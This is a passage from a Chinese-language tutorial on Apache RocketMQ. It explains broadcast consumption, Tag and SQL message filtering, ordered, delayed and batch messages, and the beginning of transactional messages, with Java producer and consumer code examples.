<li>广播模式下，网络流量和Broker的负载会成倍增加（与消费者实例数量成正比）。假设有N个实例，每条消息理论上会被传输N次。</li>
<li>每个消费者实例都要处理全量消息，对下游业务系统（如数据库）可能造成重复写入压力，需要业务方自己处理幂等性。</li>
</ul>
</li>
<li><strong>适用场景</strong>：
<ul>
<li><strong>缓存刷新/同步</strong>：多个应用服务器实例需要同时刷新本地缓存（如商品信息变更、配置更新）。</li>
<li><strong>事件通知</strong>：一个事件需要触发所有微服务实例的某个动作（如日志清理、连接重置）。</li>
<li><strong>数据镜像</strong>：多个异地系统需要维护一份相同的数据副本。</li>
</ul>
</li>
<li><strong>不适用场景</strong>：
<ul>
<li><strong>需要负载分担处理大量消息</strong>的场景（如订单处理、日志收集）。此时应使用集群模式。</li>
<li>对消息处理有严格的“只处理一次”要求，且不希望业务层做复杂幂等处理的场景。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-18">4 过滤消息</h3>
<p>RocketMQ 的过滤消息功能允许消费者只接收其感兴趣的消息，而不是订阅主题下的所有消息。这在多种消费者对同一主题有不同关注点的场景下非常有用。</p>
<blockquote>
<p>当我们相同的模块的消息都放到同一个 Topic 中，但是不同的业务需要根据不同的需求去获取不同的消息。例如仓储系统，入库出库消息都是在仓储的 Topic 中，仓储系统需要记账，就根据所需的消息去做进账与出账业务。</p>
</blockquote>
<p>RocketMQ 的消息过滤是在 Broker 端执行的核心机制，核心是通过Tag 标签过滤和SQL92 属性过滤两种方式，让消费者只接收符合条件的消息，减少无效网络传输与消费端压力，过滤在服务端完成，遵循 “匹配即投递” 原则。</p>
<h4 data-id="heading-19">4.1 Tag 过滤</h4>
<p>基于消息的 Tag 标签进行过滤，Tag 是消息的子分类标识，每个消息只能有一个 Tag。</p>
<p><strong>语法规则</strong></p>
<ul>
<li>单 Tag 匹配：如 "CREATE"，只接收标签为 CREATE 的消息。</li>
<li>多 Tag 匹配：多个 Tag 间用 <code>||</code> 分隔（逻辑或），如 "CREATE||PAY||CANCEL"。（不支持模糊匹配）</li>
<li>全匹配：用 <code>*</code> 表示接收该主题下所有消息。</li>
</ul>
<p><strong>实现原理</strong></p>
<ol>
<li>生产者发送消息时，Tag 会被计算哈希值存入 ConsumeQueue（消息消费逻辑队列）。</li>
<li>Broker 过滤时先通过 ConsumeQueue 中的 Tag 哈希值快速匹配，命中后再校验消息原始 Tag 字符串，避免哈希冲突导致误匹配。</li>
<li>消费端拉取到消息后，也会二次校验 Tag 原始值，确保过滤准确性。</li>
</ol>
<p><strong>代码案例</strong></p>
<p>生产者，向 Topic 是 <code>TopicTest</code> 发送 TagA、TagB、TagC 三种标签的消息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 启动生产者</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 创建消息体：订阅主题、Tag、消息体</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// 发送消息</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// 关闭生产者，释放资源</span>
        producer.shutdown();
    }
}
</code></pre>
<p><strong>过滤消费者</strong></p>
<p>通过指定 Tag 规则进行过滤。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 如果特定的消费群体是全新的，请指定从哪里开始</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// 配置订阅主题Topic、Tag</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "*");</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "TagA");</span>
        consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
        <span class="hljs-comment">// 设置回调函数，处理消息</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// 启动消费者，启动后会一直挂着，持续处理消息</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>过滤可以获取全部的消息、指定单个的 Tag 或者指定多个 Tag。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 通配</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"*"</span>);
<span class="hljs-comment">// 单个</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA"</span>);
<span class="hljs-comment">// 多个</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
</code></pre>
<p><strong>适用场景</strong>：简单的消息分类过滤，如订单创建、支付、取消等不同类型消息的分离，适合高吞吐量场景，性能损耗低。</p>
<h4 data-id="heading-20">4.2 SQL 过滤</h4>
<p>SQL 过滤是基于消息的自定义属性（key-value）进行过滤，支持 SQL92 语法的子集，可实现复杂条件匹配，每个消息可设置多个属性<strong/>。</p>
<p><strong>支持语法元素</strong></p>
<ul>
<li>比较运算符：<code>=</code>、<code>&lt;&gt;</code>、<code>&gt;</code>、<code>&gt;=</code>、<code>&lt;</code>、<code>&lt;=</code>。</li>
<li>逻辑运算符：<code>AND</code>、<code>OR</code>、<code>NOT</code>。</li>
<li>常量：字符串（用单引号）、数字、<code>NULL</code>。</li>
<li>函数：<code>IN</code>、<code>LIKE</code>、<code>BETWEEN</code> 等。</li>
<li>模糊匹配：<code>%</code> 匹配任意 0 个或多个字符， <code>_</code> 匹配任意单个字符  。</li>
</ul>
<p><strong>实现原理</strong>：依赖 rocketmq-filter 模块构建并执行 SQL 表达式，过滤时需读取消息的完整属性进行计算，性能略低于 Tag 过滤，但灵活性更高。</p>
<p>案例代码</p>
<p>生产者还是指定标签 ABC，并且可以自定义写入属性信息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterProducer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 启动生产者</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 创建消息体：订阅主题、Tag、消息体</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// 生产者发送带自定义属性的消息</span>
                msg.putUserProperty(<span class="hljs-string">"orderId"</span>, <span class="hljs-string">"123456"</span>);
                msg.putUserProperty(<span class="hljs-string">"qty"</span>, String.valueOf(<span class="hljs-number">10</span> + i));
                <span class="hljs-comment">// 发送消息</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// 关闭生产者，释放资源</span>
        producer.shutdown();
    }
}
</code></pre>
<p>消费者通过 SQL 进行过滤</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// 创建消费者，指定消费组</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// 设置Nameserver地址</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// 如果特定的消费群体是全新的，请指定从哪里开始</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// 配置订阅主题Topic、SQL</span>
        consumer.subscribe(TOPIC,
                MessageSelector.bySql(<span class="hljs-string">"(TAGS IS NOT NULL AND TAGS IN ('TagA', 'TagB)) "</span> +
                        <span class="hljs-string">"AND (orderId IS NOT NULL AND qty &gt; 15)"</span>));
        <span class="hljs-comment">// 设置回调函数，处理消息</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// 启动消费者，启动后会一直挂着，持续处理消息</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>过滤出标签是 TagA 和 TagB 以及 qty 大于 15 并且 orderId 不能为空。</p>
<p><strong>适用场景</strong>：复杂业务过滤，如根据订单金额、时间范围、用户等级等多维度筛选消息。</p>
<blockquote>
<p>注：通过 TAGS 过滤是不用担心性能问题，但是通过自定义属性就会造成性能问题。 RocketMQ 中被过滤掉的消息不会消失，过滤只是限制这些消息投递给当前匹配过滤条件的消费者，消息本身的生命周期完全由 Broker 的存储策略决定，和是否被过滤没有关系。</p>
<p>由于模糊匹配（特别是 %xxx 这种前置通配符）会导致 Broker 无法利用索引，必须逐条扫描消息属性，在消息量巨大时会严重影响性能。如果可能，建议在发送消息时将需要模糊匹配的维度拆分为独立的消息属性（例如将 orderType 拆分为 prefix 和 suffix 两个属性），或者直接使用 Tag 进行粗粒度过滤，再在消费端进行细粒度的模糊匹配。</p>
</blockquote>
<h3 data-id="heading-21">5 顺序消息</h3>
<p>RocketMQ 的顺序消息（FIFO 消息）是一种**高级消息类型<strong>，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。它通过</strong>消息组 (MessageGroup)** 机制保证<strong>局部顺序</strong>，在满足业务顺序需求的同时兼顾系统吞吐能力。</p>
<h4 data-id="heading-22">生产端：保证发送顺序</h4>
<ul>
<li><strong>队列选择器</strong>：通过<code>MessageQueueSelector</code>将同一业务标识（如订单 ID）的消息路由到<strong>同一个队列</strong>，避免跨队列乱序</li>
<li><strong>同步发送</strong>：必须使用<strong>同步发送</strong>（<code>send()</code>），禁止异步发送，确保消息发送成功后再发送下一条</li>
<li><strong>消息组机制</strong>：新版 RocketMQ 通过<code>MessageGroup</code>属性标记消息归属，服务端自动路由到对应队列。</li>
</ul>
<blockquote>
<p>⽣产者只有将⼀批有顺序要求的消息，放到同⼀个MesasgeQueue上，通过MessageQueue的FIFO特性保证这⼀批消息的顺序。如果不指定MessageSelector对象，那么⽣产者会采⽤轮询的⽅式将多条消息依次发送到不同的MessageQueue上。</p>
</blockquote>
<p>生产者案例代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 生产者发送顺序消息</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageQueueSelector</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> MessageQueue <span class="hljs-title function_">select</span><span class="hljs-params">(List&lt;MessageQueue&gt; mqs, Message msg, Object arg)</span> {
        <span class="hljs-comment">// 按订单ID哈希选择队列，确保同一订单消息进入同一队列</span>
        <span class="hljs-type">Integer</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> (Integer) arg;
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> orderId % mqs.size();
        <span class="hljs-keyword">return</span> mqs.get(index);
    }
}, orderId); <span class="hljs-comment">// 传递订单ID作为路由参数</span>
</code></pre>
<h4 data-id="heading-23">消费端：保证处理顺序</h4>
<ul>
<li><strong>顺序消费模式</strong>：使用<code>MessageListenerOrderly</code>（而非并发模式<code>MessageListenerConcurrently</code>）</li>
<li><strong>队列独占</strong>：同一队列同一时间仅分配给<strong>一个消费线程</strong>，线程按消息顺序串行处理</li>
<li><strong>队列锁机制</strong>：消费端通过<code>ConsumeOrderlyContext</code>自动加锁，防止同一队列被多线程并发消费。</li>
</ul>
<blockquote>
<p>消费者需要实现MessageListenerOrderly接⼝，实际上在服务端，处理MessageListenerOrderly时，会给⼀个MessageQueue加锁，拿到 MessageQueue上所有的消息，然后再去读取下⼀个MessageQueue的消息。</p>
</blockquote>
<p>消费者案例代码</p>
<pre><code class="hljs language-java" lang="java">consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerOrderly</span>() {
    <span class="hljs-type">AtomicLong</span> <span class="hljs-variable">consumeTimes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0</span>);
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeOrderlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(List&lt;MessageExt&gt; msgs, ConsumeOrderlyContext context)</span> {
        context.setAutoCommit(<span class="hljs-literal">true</span>);
        System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msgs);
        <span class="hljs-built_in">this</span>.consumeTimes.incrementAndGet();
        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {
            context.setSuspendCurrentQueueTimeMillis(<span class="hljs-number">3000</span>);
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
        }

        <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
    }
});
</code></pre>
<p>原理就是将消息都发到同一个MessageQueue。具体可以看官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F03fifomessage%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/03fifomessage/" ref="nofollow noopener noreferrer">顺序消息 | RocketMQ</a></p>
<blockquote>
<p>注：</p>
<p>1、一般场景下是局部有序，如果需要全局有序，那就将消息统一放到一个 MessageQueue 。</p>
<p>2、⽣产者端尽可能将同一组有序消息打散到不同的 MessageQueue 上，避免过于集中导致数据热点竞争。</p>
<p>3、消费者端只进⾏有限次数的重试。如果⼀条消息处理失败，RocketMQ会将后续消息阻塞住，让消费者进⾏重试。但是，如果消费者⼀直处理失败，超过最⼤重试次数，那么RocketMQ就会跳过这⼀条消息，处理后⾯的消息，这会造成消息乱序。</p>
<p>4、消费者端如果确实处理逻辑中出现问题，不建议抛出异常，可以返回 <code>ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT</code>作为替代。</p>
</blockquote>
<h3 data-id="heading-24">6 延迟消息</h3>
<p>RocketMQ 的延迟消息是一种高级消息特性，指消息发送到 Broker 后，不会立即被消费者消费，而是在指定时间（或延迟级别对应的时间）后才投递到目标 Topic 供消费者处理。该机制广泛应用于订单超时处理、定时任务调度、通知提醒等场景。</p>
<h4 data-id="heading-25">6.1 原理</h4>
<p>消息发送后，在固定的时间后才被消费，官方有两个版本，两者本质相同，均通过服务端定时调度实现，5.x 版本统一称为定时消息。</p>
<ul>
<li>RocketMQ 4.x 默认支持18 个固定延迟级别，不支持任意时间延迟。</li>
</ul>
<p>Broker 配置可自定义延迟级别：<code>messageDelayLevel=1s 5s 10s 30s 1m ... 1h 2h</code></p>
<ul>
<li>RocketMQ 5.x 引入<strong>精确定时消息</strong>，支持毫秒级任意时间延迟，通过设置绝对时间戳实现。</li>
</ul>
<h4 data-id="heading-26">6.2 代码案例</h4>
<p>生产者的核心代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
message.setDelayTimeLevel(<span class="hljs-number">3</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.print(result);
</code></pre>
<p>通过设置延迟时间级别 <code>message.setDelayTimeLevel(3)</code>代表 10 秒后发送。Broker 接收消息后，判断为延迟消息，将其暂存到内部主题 <code>SCHEDULE_TOPIC_XXXX</code>。Broker 启动定时任务线程池，每个延迟级别对应一个定时任务，定时任务周期性扫描对应队列，判断消息是否到期（存储时间 + 延迟时间≤当前时间），到期消息被重新投递到原始目标 Topic 的对应队列，消费者此时可正常消费该消息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
<span class="hljs-comment">//message.setDelayTimeSec(10);</span>
<span class="hljs-comment">// The effect is the same as the above</span>
<span class="hljs-comment">// message.setDelayTimeMs(10_000L);</span>
<span class="hljs-comment">// Set the specific delivery time, and the effect is the same as the above</span>
<span class="hljs-comment">// long deliverTime = LocalDateTime.of(2026, 1, 20, 10, 0, 0)</span>
<span class="hljs-comment">//     .atZone(ZoneId.systemDefault())</span>
<span class="hljs-comment">//     .toInstant()</span>
<span class="hljs-comment">//     .toEpochMilli();</span>
<span class="hljs-comment">// message.setDeliverTimeMs(deliverTime);</span>
message.setDeliverTimeMs(System.currentTimeMillis() + <span class="hljs-number">10_000L</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.printf(result + <span class="hljs-string">"\n"</span>);
</code></pre>
<p>时间轮将时间划分为固定槽位，每个槽位对应一个时间间隔。消息根据到期时间放入对应槽位，通过指针循环扫描处理到期消息。具体可以看官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2F4.x%2Fproducer%2F04message3%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/4.x/producer/04message3/" ref="nofollow noopener noreferrer">延迟消息发送 | RocketMQ</a></p>
<h3 data-id="heading-27">7 批量消息</h3>
<p>在对吞吐率有一定要求的情况下，Apache RocketMQ可以将一些消息聚成一批以后进行发送，可以增加吞吐率，并减少API和网络调用次数。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/754201307eb444768f601d7063b74053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=BLwYES%2FKE8GZk329Xnh5dRyoEPQ%3D" alt="" loading="lazy"/></p>
<p>案例代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 添加批量消息</span>
List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(MESSAGE_COUNT);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
    messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, TAG, <span class="hljs-string">"OrderID"</span> + i, (<span class="hljs-string">"Hello world "</span> + i).getBytes(StandardCharsets.UTF_8)));
}

<span class="hljs-comment">// 消息过多需要分片</span>
<span class="hljs-type">ListSplitter</span> <span class="hljs-variable">splitter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListSplitter</span>(messages);
<span class="hljs-keyword">while</span> (splitter.hasNext()) {
    List&lt;Message&gt; listItem = splitter.next();
    <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(listItem);
    System.out.printf(<span class="hljs-string">"%s"</span>, sendResult);
}
</code></pre>
<blockquote>
<p>注：</p>
<p>批量消息的使用非常简单，但是要注意RocketMQ做了限制。同一批消息的Topic必须相同，另外，不支持延迟消息。</p>
<p>还有批量消息的大小不要超过1M，如果太大就需要自行分割。</p>
</blockquote>
<h3 data-id="heading-28">8 事务消息</h3>
<p>事务消息为 Apache RocketMQ 中的高级特性消息，本文为您介绍事务消息的应用场景、功能原理、使用限制、使用方法和使用建议。</p>
<blockquote>
<p>事务消息是 Apache RocketMQ 提供的一种高级消息类型，支持在分布式场景下保障消息生产和本地事务的最终一致性。</p>
</blockquote>
<h4 data-id="heading-29">8.1 工作流程</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6185b6c4e9440eb88353f74cb0a1205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=axdr%2BJADgeahEhd%2BWsZlGnoAnto%3D" alt="" loading="lazy"/></p>
<blockquote>
